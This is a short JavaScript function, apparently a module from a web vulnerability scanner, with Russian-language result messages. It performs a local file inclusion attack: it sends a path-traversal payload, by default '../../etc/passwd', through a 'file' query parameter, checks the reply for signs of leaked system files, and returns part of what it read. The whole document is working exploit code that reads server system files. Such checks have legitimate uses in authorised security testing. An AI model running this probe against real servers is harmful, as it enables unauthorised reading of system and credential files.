async function base_lfi(config = { uri: '', payload: '../../etc/passwd' }) {
    const { uri, payload } = config;

    const separator = uri.includes('?') ? '&' : '?';
    const url = `${uri}${separator}file=${encodeURIComponent(payload)}`;

    try {
        const response = await fetch(url, { method: 'GET' });
        const text = await response.text();
        const isLeaked = text.includes('root:') || text.includes('boot loader') || response.headers.get('content-type')?.includes('text/plain');

        if (isLeaked || (response.ok && text.length > 50)) {
            return { result: 1, text: `Уязвимость найдена. Содержимое: ${text.substring(0, 150)}...` };
        }
        return { result: 0, text: `Файл не прочитан или возвращена ошибка. Статус: ${response.status}` };
    } catch (error) {
        return { result: 0, text: `Ошибка выполнения: ${error.message}` };
    }
}